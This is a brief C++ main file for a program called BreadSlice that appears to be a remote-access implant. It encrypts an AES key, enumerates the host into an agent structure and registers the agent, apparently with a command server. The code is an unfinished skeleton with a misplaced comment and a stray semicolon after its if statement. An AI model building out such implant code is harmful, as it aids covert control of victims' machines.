// BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "Http.h"
#include "enum.h"
#include "implant.h"
#include "parsekey.h"

Agent g_ImplantData = { 0 };

int main()

//TODO finish establishing secure comms.
{
    encryptAESKey();

    Enumerate(&g_ImplantData);
   
    
    if (!RegisterAgent());
     
}

